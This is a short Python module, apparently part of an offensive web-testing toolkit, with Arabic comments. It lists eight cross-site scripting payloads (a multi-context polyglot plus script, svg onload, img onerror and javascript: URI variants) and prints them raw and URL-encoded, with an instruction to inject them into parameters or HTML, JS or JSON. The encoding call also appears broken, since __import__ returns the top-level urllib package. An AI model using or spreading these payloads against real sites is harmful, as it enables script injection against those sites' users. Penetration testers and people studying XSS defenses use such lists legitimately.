# xss-polyglot.py — توليد حمولات XSS متعددة السياقات
from core.registry import module

POLYGLOTS = [
 "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert(1) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert(1)//>\\x3e",
 "\"'><script>alert(1)</script>",
 "javascript:alert(1)//",
 "';alert(1);//",
 "</script><script>alert(1)</script>",
 "<!--><svg onload=alert(1)-->",
 "\"><img src=x onerror=alert(1)>",
 "javascript:alert(1)\"",
]

@module("xss-polyglot", "payload", "توليد حمولات XSS")
def run(base, a, R):
    R.good("حمولات XSS متعددة السياقات:")
    for i, p in enumerate(POLYGLOTS, 1):
        enc = __import__("urllib.parse").quote(p)
        R.info(f"  [{i}] {p[:70]}...")
        R.info(f"      urlencoded: {enc[:70]}...")
    R.info("الاستخدام: ضعها في المعاملات أو داخل HTML/JS/JSON")
